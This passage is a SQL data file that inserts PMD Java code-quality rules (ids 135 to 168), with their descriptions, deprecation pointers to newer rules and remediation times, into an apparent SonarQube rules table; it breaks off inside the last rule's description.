INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (135, 'Avoid Calling Finalize', 'AvoidCallingFinalize', 'rulesets/java/finalizers.xml/AvoidCallingFinalize', 'pmd', 'Object.finalize() is called by the garbage collector on an object when garbage collection determines that there are no more references to the object.

<p>
This rule is deprecated, use {rule:squid:ObjectFinalizeCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811665, 1510817811666, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (136, 'Avoid Final Local Variable', 'AvoidFinalLocalVariable', 'rulesets/java/controversial.xml/AvoidFinalLocalVariable', 'pmd', 'Avoid using final local variables, turn them into fields. Example :
<pre>
public class MyClass {
    public void foo() {
        final String finalLocalVariable;
    }
}
  </pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811667, 1510817811667, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (137, 'Collapsible If Statements', 'CollapsibleIfStatements', 'rulesets/java/basic.xml/CollapsibleIfStatements', 'pmd', 'Sometimes two ''if'' statements can be consolidated by separating their conditions with a boolean short-circuit operator.

<p>
This rule is deprecated, use {rule:squid:S1066} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811669, 1510817811669, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (138, 'Avoid Deeply Nested If Stmts', 'AvoidDeeplyNestedIfStmts', 'rulesets/java/design.xml/AvoidDeeplyNestedIfStmts', 'pmd', 'Deeply nested if..then statements are hard to read.

<p>
This rule is deprecated, use {rule:squid:S134} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811670, 1510817811671, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (139, 'Unused local variable', 'UnusedLocalVariable', 'rulesets/java/unusedcode.xml/UnusedLocalVariable', 'pmd', 'Detects when a local variable is declared and/or assigned, but not used.

<p>
This rule is deprecated, use {rule:squid:S1481} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused-code', false, 'HTML', 1510817811673, 1510817811673, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (140, 'Useless Operation On Immutable', 'UselessOperationOnImmutable', 'rulesets/java/unnecessary.xml/UselessOperationOnImmutable', 'pmd', 'An operation on an Immutable object (BigDecimal or BigInteger) won''t change the object itself. The result of the operation is a new object. Therefore, ignoring the operation result is an error.', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811679, 1510817811679, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (141, 'Loose coupling', 'LooseCoupling', 'rulesets/java/coupling.xml/LooseCoupling', 'pmd', 'Avoid using implementation types (i.e., HashSet); use the interface (i.e, Set) instead

<p>
This rule is deprecated, use {rule:squid:S1319} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811681, 1510817811682, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (142, 'Final Field Could Be Static', 'FinalFieldCouldBeStatic', 'rulesets/java/design.xml/FinalFieldCouldBeStatic', 'pmd', 'If a final field is assigned to a compile-time constant, it could be made static, thus saving overhead in each object at runtime.

<p>
This rule is deprecated, use {rule:squid:S1170} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811683, 1510817811683, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (143, 'Simplify Conditional', 'SimplifyConditional', 'rulesets/java/design.xml/SimplifyConditional', 'pmd', 'No need to check for null before an instanceof; the instanceof keyword returns false when given a null argument.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811684, 1510817811685, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (144, 'Missing Serial Version UID', 'MissingSerialVersionUID', 'rulesets/java/javabeans.xml/MissingSerialVersionUID', 'pmd', 'Classes that are serializable should provide a serialVersionUID field.

<p>
  This rule is deprecated, use {rule:squid:S2057} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811686, 1510817811687, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (145, 'Naming - Suspicious Hashcode method name', 'SuspiciousHashcodeMethodName', 'rulesets/java/naming.xml/SuspiciousHashcodeMethodName', 'pmd', 'The method name and return type are suspiciously close to hashCode(), which may mean you are intending to override the hashCode() method. Example :
<pre>
public class Foo {
  public int hashcode() {
  // oops, this probably was supposed to be hashCode
  }
}</pre>

<p>
This rule is deprecated, use {rule:squid:S1221} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811688, 1510817811688, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (146, 'Guard Log Statement', 'GuardLogStatement', 'rulesets/java/logging-jakarta-commons.xml/GuardLogStatement', 'pmd', 'Whenever using a log level, one should check if the loglevel is actually enabled, or
otherwise skip the associate String creation and manipulation. Example: 
<pre>
// Add this for performance
if (log.isDebugEnabled() { ...
  log.debug("This happens");
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811689, 1510817811690, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (147, 'Unused imports', 'UnusedImports', 'rulesets/java/imports.xml/UnusedImports', 'pmd', 'Avoid unused import statements. Example :
  <pre>
// this is bad
import java.io.File;
public class Foo {}
  </pre>

<p>
This rule is deprecated, use {rule:squid:UselessImportCheck} instead.
</p>', 0, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817811691, 1510817811692, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (148, 'Preserve Stack Trace', 'PreserveStackTrace', 'rulesets/java/design.xml/PreserveStackTrace', 'pmd', 'Throwing a new exception from a catch block without passing the original exception into the new Exception will cause the true stack trace to be lost, and can make it difficult to debug effectively.

<p>
This rule is deprecated, use {rule:squid:S1166} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811693, 1510817811693, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (149, 'Switch statements should have default', 'SwitchStmtsShouldHaveDefault', 'rulesets/java/design.xml/SwitchStmtsShouldHaveDefault', 'pmd', 'Switch statements should have a default label. Example :
<pre>
public class Foo {
 public void bar() {
  int x = 2;
  switch (x) {
   case 2: int j = 8;
  }
 }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:SwitchLastCaseIsDefaultCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811694, 1510817811695, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (150, 'Strict Exception - Avoid throwing new instance of same exception', 'AvoidThrowingNewInstanceOfSameException', 'rulesets/java/strictexception.xml/AvoidThrowingNewInstanceOfSameException', 'pmd', 'Catch blocks that merely rethrow a caught exception wrapped inside a new instance of the same type only add to code size and runtime complexity. Example :
<pre>
public class Foo {
  void bar() {
    try {
      // do something
    }  catch (SomeException se) {
      // harmless comment
      throw new SomeException(se);
    }
  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1166} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811696, 1510817811697, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (151, 'Dont Import Sun', 'DontImportSun', 'rulesets/java/controversial.xml/DontImportSun', 'pmd', 'Avoid importing anything from the ''sun.*'' packages. These packages are not portable and are likely to change.

<p>
This rule is deprecated, use {rule:squid:S1191} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, NULL, false, 'HTML', 1510817811698, 1510817811698, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (152, 'Logger Is Not Static Final', 'LoggerIsNotStaticFinal', 'rulesets/java/logging-java.xml/LoggerIsNotStaticFinal', 'pmd', 'In most cases, the Logger can be declared static and final.

<p>
This rule is deprecated, use {rule:squid:S1312} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811699, 1510817811703, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (153, 'Unused Imports (With Type Resolution)', 'UnusedImportsWithTypeResolution', 'rulesets/java/typeresolution.xml/UnusedImports', 'pmd', 'Avoid unused import statements. This rule will find unused on demand imports, i.e. import com.foo.*. Example: 
<pre>
import java.io.*; // not referenced or required

public class Foo {}
</pre>

<p>
This rule is deprecated, use {rule:squid:UselessImportCheck} instead.
</p>', 0, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811704, 1510817811705, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (154, 'Return empty array rather than null', 'ReturnEmptyArrayRatherThanNull', 'rulesets/java/design.xml/ReturnEmptyArrayRatherThanNull', 'pmd', 'For any method that returns an array, it''s a better behavior to return an empty array rather than a null reference. Example :
<pre>
public class Example
{
  // Not a good idea...
  public int []badBehavior()
  {
    // ...
    return null;
  }

  // Good behavior
  public String[] bonnePratique()
  {
    //...
    return new String[0];
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1168} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811706, 1510817811706, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (155, 'Boolean Instantiation', 'BooleanInstantiation', 'rulesets/java/basic.xml/BooleanInstantiation', 'pmd', 'Avoid instantiating Boolean objects; you can reference Boolean.TRUE, Boolean.FALSE, or call Boolean.valueOf() instead.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811707, 1510817811708, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (156, 'Non Thread Safe Singleton', 'NonThreadSafeSingleton', 'rulesets/java/design.xml/NonThreadSafeSingleton', 'pmd', 'Non-thread safe singletons can result in bad state changes. Eliminate static singletons if possible by instantiating the object directly. Static singletons are usually not needed as only a single instance exists anyway. Other possible fixes are to synchronize the entire method or to use an initialize-on-demand holder class (do not use the double-check idiom). See Effective Java, item 48.

<p>
  This rule is deprecated, use {rule:squid:S2444} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'multithreading', false, 'HTML', 1510817811709, 1510817811709, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (157, 'Avoid Using Native Code', 'AvoidUsingNativeCode', 'rulesets/java/controversial.xml/AvoidUsingNativeCode', 'pmd', 'As JVM and Java language offer already many help in creating application, it should be very rare to have to rely on non-java code. Even though, it is rare to actually have to use Java Native Interface (JNI). As the use of JNI make application less portable, and harder to maintain, it is not recommended.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3h', NULL, NULL, NULL, false, 'HTML', 1510817811715, 1510817811718, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (158, 'Avoid Array Loops', 'AvoidArrayLoops', 'rulesets/java/optimizations.xml/AvoidArrayLoops', 'pmd', 'Instead of copying data between two arrays, use System.arrayCopy method', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811720, 1510817811720, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (159, 'Do not call garbage collection explicitly', 'DoNotCallGarbageCollectionExplicitly', 'rulesets/java/controversial.xml/DoNotCallGarbageCollectionExplicitly', 'pmd', 'Calls to System.gc(), Runtime.getRuntime().gc(), and System.runFinalization() are not advised. Code should have the same behavior whether the garbage collection is disabled using the option -Xdisableexplicitgc or not. Moreover, "modern" jvms do a very good job handling garbage collections. If memory usage issues unrelated to memory leaks develop within an application, it should be dealt with JVM options rather than within the code itself. Example :
<pre>
 public class GCCall
{
  public GCCall()
  {
  // Explicit gc call !
    System.gc();
  }
  public void doSomething()
  {
    // Explicit gc call !
    Runtime.getRuntime().gc();
  }

  public explicitGCcall() { // Explicit gc call ! System.gc(); }

  public void doSomething() { // Explicit gc call ! Runtime.getRuntime().gc(); }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1215} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811721, 1510817811722, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (160, 'Excessive Method Length', 'ExcessiveMethodLength', 'rulesets/java/codesize.xml/ExcessiveMethodLength', 'pmd', 'Violations of this rule usually indicate that the method is doing too much. Try to reduce the method size by creating helper methods and removing any copy/pasted code.

<p>
This rule is deprecated, use {rule:squid:S138} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811723, 1510817811724, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (161, 'Use Notify All Instead Of Notify', 'UseNotifyAllInsteadOfNotify', 'rulesets/java/design.xml/UseNotifyAllInsteadOfNotify', 'pmd', 'Thread.notify() awakens a thread monitoring the object. If more than one thread is monitoring, then only one is chosen. The thread chosen is arbitrary; thus it''s usually safer to call notifyAll() instead.

<p>
  This rule is deprecated, use {rule:squid:S2446} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811726, 1510817811726, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (162, 'Consecutive Literal Appends', 'ConsecutiveLiteralAppends', 'rulesets/java/strings.xml/ConsecutiveLiteralAppends', 'pmd', 'Consecutively calling StringBuffer.append with String literals', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811727, 1510817811728, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (163, 'Idempotent Operations', 'IdempotentOperations', 'rulesets/java/design.xml/IdempotentOperations', 'pmd', 'Avoid idempotent operations - they are have no effect. Example : <br/><code>int x = 2;<br/> x = x;</code>

<p>
This rule is deprecated, use {rule:squid:S1656} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3min', NULL, NULL, NULL, false, 'HTML', 1510817811730, 1510817811730, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (164, 'getInstance should cache the instance', 'SingletonClassReturningNewInstance', 'rulesets/java/design.xml/SingletonClassReturningNewInstance', 'pmd', '<p>
  Some classes contain overloaded getInstance. The problem with overloaded getInstance methods is that the instance created using the overloaded method is not cached and so, for each call and new objects will be created for every invocation.
</p>

<p>Examples:</p>
<pre>
class Singleton {
  private static Singleton instance = null;

  public static Singleton getInstance() {
    synchronized(Singleton.class) {
      return new Singleton();
    }
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811731, 1510817811732, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (165, 'Generics Naming', 'GenericsNaming', 'rulesets/java/naming.xml/GenericsNaming', 'pmd', 'Generics names should be a one letter long and upper case.

<p>
This rule is deprecated, use {rule:squid:S00119} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'naming', false, 'HTML', 1510817811739, 1510817811739, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (166, 'Naming - Method with same name as enclosing class', 'MethodWithSameNameAsEnclosingClass', 'rulesets/java/naming.xml/MethodWithSameNameAsEnclosingClass', 'pmd', 'Non-constructor methods should not have the same name as the enclosing class. Example :
<pre>
public class MyClass {
  // this is bad because it is a method
  public void MyClass() {}
  // this is OK because it is a constructor
  public MyClass() {}
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1223} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811740, 1510817811741, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (167, 'Simplify boolean returns', 'SimplifyBooleanReturns', 'rulesets/java/design.xml/SimplifyBooleanReturns', 'pmd', 'Avoid unnecessary if..then..else statements when returning a boolean. Example :
<pre>
public class Foo {
  private int bar =2;
  public boolean isBarEqualsTo(int x) {
    // this bit of code
    if (bar == x) {
     return true;
    } else {
     return false;
    }
    // can be replaced with a simple
    // return bar == x;
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1126} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811742, 1510817811743, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (168, 'Only one getInstance method is allowed', 'SingleMethodSingleton', 'rulesets/java/design.xml/SingleMethodSingleton', 'pmd', '<p>
  Some classes contain overloaded getInstance. The problem with overloaded getInstance methods is that the instance created using the overloaded method is not cached and so, for each call and new objects will be created for every invocation.
</p>

<p>Examples:</p>
<pre>
public class Singleton {
  private static Singleton singleton = new Singleton( );

  private Singleton() { }

  public static Singleton getInstance( ) {
    return singleton;
  }

  public static Singleton getInstance(Object obj) {
    Singleton singleton = (Singleton) obj;
    return singleton; //violation
  }
}
